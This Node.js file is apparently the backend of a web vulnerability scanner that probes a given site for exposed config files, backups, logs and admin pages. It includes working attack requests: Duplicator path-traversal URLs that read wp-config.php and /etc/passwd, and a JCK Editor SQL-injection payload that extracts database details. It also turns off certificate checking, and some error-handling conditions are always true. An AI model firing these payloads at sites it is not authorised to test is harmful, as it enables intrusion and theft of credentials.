const axios = require('axios');
const https = require('https');
const psl = require('psl');

const responseClass = require('../models/response')

const agent = new https.Agent({
    rejectUnauthorized: false
});

exports.getWebsite = async (req, res) => {
    try {
        const resp = await axios.get(req.query.url, {timeout: req.query.timeout, httpsAgent: agent});
        return res.status(resp.status).send(console.log(resp.status))
    } catch (error) {
        if (error.code == "ENOTFOUND") {
            return res.status(500).send(console.log("Something went wrong with the request."))
        } if (error.code == "ECONNABORTED") {
            return res.status(408).send(console.log("Request took too long."))
        } else {
            return res.status(error.response.status).send(console.log(error.response.status))
        }
    }
    
}

exports.getPhpInfo = (req, res) => {
    multipleGetRequests(["/phpinfo.php","/test.php","/info.php","/phpinfo" ],"PHP Version","PHP info page exposure",req,res)
}

exports.getWPConfig = (req, res) => {
    multipleGetRequests(["/wp-config.php.save","/wp-config.php~","/wp-config.php_orig","/wp-config.php.old","/wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php" ],"The base configurations of the WordPress.","WordPress config exposure",req,res)
}

exports.getErrorLog = (req, res) => {
    multipleGetRequests(["/error.log","/error_log.txt","/logs/errors.log","/error_log" ],"PHP Fatal error","Error log exposure",req,res)
}

exports.getPhpMyAdmin = (req, res) => {
    multipleGetRequests(["/phpmyadmin/setup/index.php","/phpmyadmin/scripts/setup.php","/pma/setup/index.php","/pma/scripts/setup.php" ],"MyAdmin","PhpMyAdmin setup page exposure",req,res)
}

exports.getSQLDump = (req, res) => {
    multipleGetRequests(["/dump.sql","/backup.sql","/sql.sql","/db_backup.sql","/db.sql","/database.sql",getDomainName(req.query.url,"full")+".sql" ],"TABLE","Database backup exposure",req,res)
}

exports.getBackup = (req, res) => {
    multipleGetRequests([getDomainName(req.query.url,"full")+".zip",getDomainName(req.query.url,"name")+".tar.gz",getDomainName(req.query.url,"name")+".zip" ],"ï¿½","Website backup exposure",req,res)
}

exports.getGitConfig = (req, res) => {
    getRequest("/.git/config","core","Git config exposure",req,res)
}

exports.getDockerCompose = (req, res) => {
    getRequest("/docker-compose.yml","version","Docker compose config exposure",req,res) 
}

exports.getLaravelLog = (req, res) => {
    getRequest("/storage/logs/laravel.log","laravel","Laravel log exposure",req,res) 
}

exports.getWPDebugLog = (req, res) => {
    getRequest("/wp-content/debug.log","wp","WordPress debug log exposure",req,res) 
}

exports.getApacheStatus = (req, res) => {
    getRequest("/server-status","Apache Status","Apache server status exposure",req,res) 
}

exports.getSymfonyDatabaseConfig = (req, res) => {
    getRequest("/config/databases.yml","symfony","Symfony database config exposure",req,res) 
}

exports.getLocalFileInclusionGeneric = (req, res) => {
    getRequest("/etc/passwd","daemon","Local file inclusion",req,res) 
}

exports.getLocalFileInclusionDuplicator = (req, res) => {
    getRequest("/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","daemon","Local file inclusion due to Duplicator",req,res) 
}

exports.getWPLogin = (req, res) => {
    getRequest("/wp-login.php","loginform","WordPress public login page",req,res) 
}

exports.getJCKEditor = (req, res) => {
    getRequest('/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&parent="%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),NULL,NULL,NULL,NULL,NULL--%20aa&view=menu',"node","JCK Editor SQL injection",req,res) 
}

exports.getJoomlaConfig = (req, res) => {
    getRequest("/configuration.php-dist","Database configuration section","Joomla Config exposure",req,res) 
}

async function getRequest(endpoint,regex,vulnerabilityName,req,res) {
        try {
            regex = new RegExp("\\W?"+regex+"\\W")
            const resp = await axios.get(req.query.url + endpoint, {signal: AbortSignal.timeout(parseInt(req.query.timeout)), httpsAgent: agent});
            if (resp.data.match(regex) && resp.status == 200 && resp.status != undefined) {
                return res.status(resp.status).send(new responseClass.Response(resp.status,"Vulnerability found.",resp.config.url,vulnerabilityName))
            }
            else {
                return res.status(404).send(new responseClass.Response(resp.status,resp.statusText,resp.config.url,vulnerabilityName))
            }
        } catch (error) {
            if (error.code == "ERR_BAD_REQUEST") {
                return res.status(error.response.status).send(new responseClass.Response(error.response.status,error.response.statusText,error.config.url,vulnerabilityName))
            } if (error.code == "ENOTFOUND" || "ECONNREFUSED" || "EPROTO") {
                return res.status(500).send(new responseClass.Response(500,"Website may not exist.",error.config.url,vulnerabilityName)) 
            } if (error.code == "ECONNABORTED" || "ERR_CANCELED") {
                return res.status(408).send(new responseClass.Response(408,"Request took too long. Try again with a longer timeout or test it manually.",error.config.url,vulnerabilityName))
            } else {
                return res.status(error.response.status).send(new responseClass.Response(error.response.status,error.response.statusText,error.response.config.url,vulnerabilityName))
            }
        }
}

function multipleGetRequests(endpoints,regex,vulnerabilityName,req,res) {
    let requests = [];
    for (let index = 0; index < endpoints.length; index++) {
        const endpoint = endpoints[index];
        requests.push(axios.get(req.query.url + endpoint, {signal: AbortSignal.timeout(parseInt(req.query.timeout)), httpsAgent: agent}))
    }
    Promise.allSettled(requests).then((results) => {
        regex = new RegExp("\\W?"+regex+"\\W")
        for (let index = 0; index < results.length; index++) {
            const result = results[index];
            if (result.value != undefined && result.value.status == 200 && result.value.data.match(regex)) {
                return res.status(result.value.status).send(new responseClass.Response(result.value.status,"Vulnerability found.",result.value.config.url,vulnerabilityName))
            }
             if (!results[index + 1] && result.status != "fulfilled") {
                if (result.reason.code == "ERR_BAD_REQUEST") {
                    return res.status(result.reason.response.status).send(new responseClass.Response(result.reason.response.status,result.reason.response.statusText,result.reason.config.url,vulnerabilityName))
                } if (result.reason.code == "ENOTFOUND" || "ECONNREFUSED" || "EPROTO") {
                    return res.status(500).send(new responseClass.Response(500,"Website may not exist.",result.reason.config.url,vulnerabilityName)) 
                } if (result.reason.code == "ECONNABORTED" || "ERR_CANCELED") {
                    return res.status(408).send(new responseClass.Response(408,"Request took too long. Try again with a longer timeout or test it manually.",result.reason.config.url,vulnerabilityName))
                } else {
                    return res.status(result.reason.response.status).send(new responseClass.Response(result.reason.response.status,result.reason.response.statusText,result.reason.config.url,vulnerabilityName))
                }
            }
            if (!results[index + 1] && result.status == "fulfilled") {
                return res.status(404).send(new responseClass.Response(404,"Not found",result.value.config.url,vulnerabilityName))
            }
        }
      })
}

function getDomainName(domain,type) {
    String(domain)
    if (type == "full") {
        domain = domain.replace(/^https?:\/\//, '/')
        domain = domain.replace(/\/+$/, "");
        return domain
    }
    if (type == "name") {
        domain = domain.replace(/^https?:\/\//, '')
        domain = domain.replace(/\/+$/, "");
        return psl.parse(domain).sld
    }

}